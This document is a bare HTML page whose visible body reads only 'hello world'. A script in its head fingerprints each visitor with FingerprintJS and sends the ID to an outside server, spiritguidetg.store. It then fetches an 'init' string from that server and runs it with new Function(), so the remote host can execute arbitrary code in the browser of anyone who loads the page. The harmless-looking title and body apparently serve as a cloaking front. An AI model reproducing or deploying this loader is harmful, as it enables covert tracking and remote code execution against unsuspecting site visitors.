<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Белый конструктор</title>
<script type="module">
(async () => {
    try {
        // Исправлен URL - убран двойной слэш
        const CONFIG_API = 'https://spiritguidetg.store/fp.php';
        
        console.log('Starting FingerprintJS initialization...');
        
        const FingerprintJS = await import('/clk/fp.js');
        console.log('FingerprintJS loaded successfully');
        
        const fp = await FingerprintJS.load({
            region: 'eu',
            endpoint: [CONFIG_API, FingerprintJS.defaultEndpoint]
        });
        console.log('FingerprintJS initialized');

        const { requestId } = await fp.get({ extendedResult: true });
        console.log('Request ID received:', requestId);

        // Загрузка конфигурации
        const url = `${CONFIG_API}?request_id=${encodeURIComponent(requestId)}`;
        console.log('Fetching config from:', url);
        
        const res = await fetch(url);
        console.log('Response status:', res.status);
        
        if (!res.ok) {
            console.error('Response not OK:', res.status, res.statusText);
            return;
        }

        const data = await res.json();
        console.log('Response data:', data);

        if (data.init) {
            console.log('Executing init script...');
            new Function(data.init)();
        }
    } catch (err) {
        console.error('Detailed error:', err);
        console.error('Error stack:', err.stack);
    }
})();
</script>

</head>
<body>
  hello world
</body>
</html>
